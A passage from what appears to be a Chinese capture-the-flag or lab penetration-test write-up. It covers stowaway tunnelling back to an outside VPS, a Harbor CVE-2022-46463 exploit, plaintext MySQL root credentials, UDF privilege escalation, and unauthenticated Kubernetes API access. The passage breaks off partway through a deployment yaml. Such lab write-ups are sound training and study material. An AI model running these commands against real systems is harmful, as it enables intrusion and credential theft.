</span></span></code></pre></div><p>扫到的主要内容是</p><ul><li><p><strong>172.22.14.37</strong>（Linux）：</p><ul><li><strong>SSH（22端口）</strong>：OpenSSH 7.6p1</li><li><strong>2379端口</strong>（可能是 etcd）和 <strong>10250端口</strong>（可能是 Kubernetes API）</li></ul></li><li><p><strong>172.22.14.46</strong>（Linux）：</p></li><li><p><strong>HTTP（80端口）</strong>：运行 <strong>Harbor</strong></p></li></ul><p>需要二层代理转发</p><h1 id=flag5>flag5</h1><p>frp我这里多层代理转发一直有问题，所以我换了stowaway</p><p>在个人vps上执行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./linux_x64_admin -l <span style=color:#ae81ff>2223</span> -s <span style=color:#ae81ff>2223</span>
</span></span></code></pre></div><p>在第一层也就是靶机入口处执行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./linux_x64_agent -c 27.25.151.99:2223 -s <span style=color:#ae81ff>2223</span> --reconnect <span style=color:#ae81ff>8</span>
</span></span></code></pre></div><p>在第二层也就是oa系统内部</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./linux_x64_agent -c 172.28.23.17:8889 -s <span style=color:#ae81ff>2223</span> --reconnect <span style=color:#ae81ff>8</span>
</span></span></code></pre></div><p>最后走个socks 6000端口一样打(确实方便好多)</p><p>先针对172.22.14.46端口，打个cve<a href=https://github.com/404tk/CVE-2022-46463/blob/main/harbor.py>CVE-2022-46463/harbor.py at main · 404tk/CVE-2022-46463</a></p><p><img alt=2025-05-19172043 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19172043.png></p><p>简单的查看了信息</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>python harbor.py http<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>46</span>/ --dump harbor/secret --v2
</span></span></code></pre></div><p>里面存在一个run.sh还有一个flag文件，得到了flag5</p><p><img alt=2025-05-19172357 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19172357.png></p><h1 id=flag6>flag6</h1><p>下载projectadmin镜像</p><p><img alt=2025-05-19172548 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19172548.png></p><p>查看到run.sh</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span>sleep <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># start</span>
</span></span><span style=display:flex><span>java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar
</span></span><span style=display:flex><span>/usr/bin/tail -f /dev/null
</span></span></code></pre></div><p>找到<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>然后反编译</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mkdir unpacked
</span></span><span style=display:flex><span>cd unpacked
</span></span><span style=display:flex><span>jar -xf ../ProjectAdmin-0.0.1-SNAPSHOT.jar
</span></span></code></pre></div><p>可以得到数据库的信息</p><p><img alt=2025-05-19173211 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19173211.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8<span style=color:#960050;background-color:#1e0010>&amp;</span>useUnicode=true<span style=color:#960050;background-color:#1e0010>&amp;</span>serverTimezone=UTC
</span></span><span style=display:flex><span>spring.datasource.username=root
</span></span><span style=display:flex><span>spring.datasource.password=My3q1i4oZkJm3
</span></span><span style=display:flex><span>spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mybatis.type-aliases-package=com.smartlink.projectadmin.entity
</span></span><span style=display:flex><span>mybatis.mapper-locations=classpath:mybatis/mapper/*.xml
</span></span></code></pre></div><p>直接用用MDUT进行UDF提权拿到flag6</p><p><img alt=2025-05-19173405 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19173405.png></p><h1 id=flag4>flag4</h1><p>之后对172.22.14.37进行扫描，先上传</p><pre tabindex=0><code>fscan -h 172.22.14.37 -p 1-65535
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>D:\ONE-FOX集成工具箱_V8.2公开版_by狐狸\gui_scan\fscan&gt;fscan -h <span style=color:#ae81ff>172.22</span>.14.37 -p <span style=color:#ae81ff>1</span>-<span style=color:#ae81ff>65535</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>┌──────────────────────────────────────────────┐</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>│</span>    ___                              _        <span style=color:#960050;background-color:#1e0010>│</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>│</span>   / _ \     ___  ___ _ __ __ _  ___| | __    <span style=color:#960050;background-color:#1e0010>│</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>│</span>  / /_\/____/ __|/ __| <span style=color:#960050;background-color:#1e0010>&#39;</span>__/ _` |/ __| |/ /    <span style=color:#960050;background-color:#1e0010>│</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>│</span> / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     <span style=color:#960050;background-color:#1e0010>│</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>│</span> \____/     |___/\___|_|  \__,_|\___|_|\_\    <span style=color:#960050;background-color:#1e0010>│</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>└──────────────────────────────────────────────┘</span>
</span></span><span style=display:flex><span>      Fscan Version<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>2.0</span>.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10</span>] [<span style=color:#66d9ef>INFO</span>] 暴力破解线程数<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>INFO</span>] 开始信息扫描
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>INFO</span>] 最终有效主机数量<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>INFO</span>] 开始主机扫描
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>INFO</span>] 有效端口数量<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>65535</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>SUCCESS</span>] 端口开放 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>22</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>53</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>SUCCESS</span>] 服务识别 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>22</span> =&gt; [<span style=color:#66d9ef>ssh</span>] 版本<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>7</span>.6p1 Ubuntu 4ubuntu0.7 产品<span style=color:#960050;background-color:#1e0010>:</span>OpenSSH 系统<span style=color:#960050;background-color:#1e0010>:</span>Linux 信息<span style=color:#960050;background-color:#1e0010>:</span>Ubuntu Linux; protocol <span style=color:#ae81ff>2.0</span> Banner<span style=color:#960050;background-color:#1e0010>:</span>[SSH-<span style=color:#ae81ff>2.0</span>-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.]
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>54</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>39</span>] [<span style=color:#66d9ef>SUCCESS</span>] 端口开放 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2380</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>54</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>39</span>] [<span style=color:#66d9ef>SUCCESS</span>] 端口开放 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2379</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>54</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>49</span>] [<span style=color:#66d9ef>SUCCESS</span>] 服务识别 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2380</span> =&gt;
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>54</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>54</span>] [<span style=color:#66d9ef>SUCCESS</span>] 服务识别 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2379</span> =&gt;
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>57</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10</span>] [<span style=color:#66d9ef>SUCCESS</span>] 端口开放 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>6443</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2025</span>-<span style=color:#ae81ff>05</span>-<span style=color:#ae81ff>19</span> <span style=color:#ae81ff>16</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>58</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>05</span>] [<span style=color:#66d9ef>SUCCESS</span>] 服务识别 <span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>6443</span> =&gt;
</span></span></code></pre></div><p>存在 Kubernetes API server 未授权</p><p><img alt=2025-05-19165635 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19165635.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;paths&#34;: </span>[
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/api&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/api/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/admissionregistration.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/admissionregistration.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/admissionregistration.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apiextensions.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apiextensions.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apiextensions.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apiregistration.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apiregistration.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apiregistration.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apps&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/apps/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/authentication.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/authentication.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/authentication.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/authorization.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/authorization.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/authorization.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/autoscaling&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/autoscaling/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/autoscaling/v2beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/autoscaling/v2beta2&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/batch&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/batch/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/batch/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/certificates.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/certificates.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/coordination.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/coordination.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/coordination.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/events.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/events.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/extensions&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/extensions/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/networking.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/networking.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/networking.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/node.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/node.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/policy&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/policy/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/rbac.authorization.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/rbac.authorization.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/rbac.authorization.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/scheduling.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/scheduling.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/scheduling.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/storage.k8s.io&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/storage.k8s.io/v1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/apis/storage.k8s.io/v1beta1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/autoregister-completion&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/etcd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/log&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/ping&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/apiservice-openapi-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/apiservice-registration-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/apiservice-status-available-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/bootstrap-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/ca-registration&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/crd-informer-synced&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/generic-apiserver-start-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/kube-apiserver-autoregistration&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/rbac/bootstrap-roles&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/scheduling/bootstrap-system-priority-classes&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/start-apiextensions-controllers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/start-apiextensions-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/start-kube-aggregator-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/healthz/poststarthook/start-kube-apiserver-admission-initializer&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/autoregister-completion&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/etcd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/log&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/ping&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/apiservice-openapi-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/apiservice-registration-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/apiservice-status-available-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/bootstrap-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/ca-registration&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/crd-informer-synced&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/generic-apiserver-start-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/kube-apiserver-autoregistration&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/rbac/bootstrap-roles&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/scheduling/bootstrap-system-priority-classes&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/start-apiextensions-controllers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/start-apiextensions-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/start-kube-aggregator-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/livez/poststarthook/start-kube-apiserver-admission-initializer&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/logs&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/metrics&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/openapi/v2&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/autoregister-completion&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/etcd&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/log&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/ping&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/apiservice-openapi-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/apiservice-registration-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/apiservice-status-available-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/bootstrap-controller&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/ca-registration&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/crd-informer-synced&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/generic-apiserver-start-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/kube-apiserver-autoregistration&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/rbac/bootstrap-roles&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/scheduling/bootstrap-system-priority-classes&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/start-apiextensions-controllers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/start-apiextensions-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/start-kube-aggregator-informers&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/poststarthook/start-kube-apiserver-admission-initializer&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/readyz/shutdown&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/version&#34;</span>
</span></span><span style=display:flex><span>  ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS E:\tools&gt; kubectl --insecure-skip-tls-verify -s https<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>172.22</span>.14.<span style=color:#ae81ff>37</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>6443</span>/ get pods
</span></span><span style=display:flex><span>Please enter Username<span style=color:#960050;background-color:#1e0010>:</span> test
</span></span><span style=display:flex><span>Please enter Password<span style=color:#960050;background-color:#1e0010>:</span> NAME                                READY   STATUS    RESTARTS   AGE
</span></span><span style=display:flex><span>nginx-deployment-864f8bfd6f-697jq   <span style=color:#ae81ff>1</span>/<span style=color:#ae81ff>1</span>     Running   <span style=color:#ae81ff>0</span>          61s
</span></span></code></pre></div><p>写一个yaml</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>apps/v1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Deployment</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>nginx-deployment</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>labels</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>app</span>: <span style=color:#ae81ff>nginx</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>replicas</span>: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>selector</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>matchLabels</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>app</span>: <span style=color:#ae81ff>nginx</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>template</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>labels</span>:
